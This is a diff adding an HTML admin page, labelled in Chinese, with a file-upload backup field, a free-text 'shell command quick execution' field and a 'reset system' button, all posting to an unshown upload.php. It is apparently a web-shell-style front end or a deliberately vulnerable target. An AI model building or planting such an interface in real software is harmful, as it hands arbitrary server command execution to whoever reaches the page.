@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>File Processor</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ff4081 0%, #81d4fa 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .wrapper {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 500px;
+            box-sizing: border-box;
+            display: grid;
+            grid-template-rows: auto auto 1fr auto;
+            gap: 20px;
+            animation: slideIn 1s ease-out;
+        }
+        @keyframes slideIn {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        h1 {
+            margin: 0;
+            font-size: 1.8em;
+            color: #333;
+            text-align: center;
+        }
+        .file-upload, .command-input, .reset-section {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .file-upload label, .command-input label {
+            font-weight: bold;
+            color: #555;
+        }
+        .file-input-container {
+            position: relative;
+            width: 100%;
+        }
+        .file-input {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+            box-sizing: border-box;
+        }
+        .file-label {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background-color: #fff;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-sizing: border-box;
+        }
+        .file-label:hover {
+            background-color: #f1f1f1;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        .actions {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        input[type="submit"] {
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-sizing: border-box;
+        }
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <h1>XXX系统管理后台</h1>
+
+        <form class="file-upload" action="upload.php" method="post" enctype="multipart/form-data">
+            <label for="file">文件上传备份</label>
+            <div class="file-input-container">
+                <input type="file" name="file" id="file" class="file-input">
+                <label for="file" class="file-label">点击选择文件</label>
+            </div>
+            <label for="cmd">shell指令快速执行接口</label>
+            <input type="text" name="cmd" id="cmd" placeholder="请输入命令">
+            <div class="actions">
+                <input type="submit" value="上传文件并执行命令">
+            </div>
+        </form>
+
+        <form class="reset-section" action="upload.php" method="post">
+            <input type="hidden" name="reset" value="true">
+            <div class="actions">
+                <input type="submit" value="重置系统">
+            </div>
+        </form>
+    </div>
+</body>
+</html>
